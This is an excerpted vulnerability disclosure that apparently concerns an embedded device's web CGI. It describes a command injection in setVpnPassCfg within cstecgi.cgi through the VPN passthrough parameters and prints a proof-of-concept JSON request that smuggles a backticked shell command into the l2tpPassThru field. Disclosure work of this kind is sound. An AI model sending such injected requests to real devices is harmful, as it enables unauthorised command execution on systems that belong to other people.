...
The vulnerability is located in the function `sub_41174C` within `cstecgi.cgi`, also known as `setVpnPassCfg`.

![](Pasted%20image%2020231129160607.png)
...
therefore , by controlling parameter among  `l2tpPassThru,ipsecPassThru,pptpPassThru` , we can finally make an arbitrary command execution
...
{"WANPingFilter":"1","l2tpPassThru":"`id > /1.txt;`","topicurl":"setVpnPassCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231129160646.png)